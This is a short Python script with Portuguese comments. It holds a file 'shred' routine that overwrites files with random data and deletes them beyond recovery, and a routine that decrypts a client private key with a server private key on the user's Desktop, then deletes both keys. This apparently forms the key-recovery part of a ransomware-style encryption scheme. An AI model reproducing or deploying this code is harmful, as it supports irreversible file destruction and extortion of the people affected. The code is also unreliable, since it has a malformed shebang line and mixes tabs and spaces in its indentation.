#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
from Crypto.PublicKey import RSA
import os
import string
import random

def generate_data(length):
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

# destroi o arquivo original e depois exclui, não podendo recupera-lo com buscas na memória
def shred(file_name,  passes):
    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)


# DESCRIPTOGRAFA A CHAVE PRIVADA DO CLIENTE COM A CHAVE PRIVADA DO SERVIDOR
def SRSA_to_RSA():
    caminho = os.environ['HOME']+'/Desktop/'
    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

	readsize = 127
	writesize = 128
	f = open(caminho_correto + 'chave_privada_cliente.txt.enc','rb')
	p = open(caminho_correto + 'chave_privada_cliente.txt','wb')
	g = open(caminho_correto + 'CHAVE_PRIVADA_SERVIDOR.txt','rb')
	chave_privada = g.read()
	chave_privada_objeto = RSA.importKey(chave_privada)

	while True:
		length = f.read(1)
		if not length:
			break
		data = f.read(ord(length))

		dec_data = chave_privada_objeto.decrypt(data)
		p.write(dec_data[:readsize])
	p.close()
	f.close()
	g.close()
	os.remove(caminho_correto + 'chave_privada_cliente.txt.enc')
	os.remove(caminho_correto + 'CHAVE_PRIVADA_SERVIDOR.txt') 
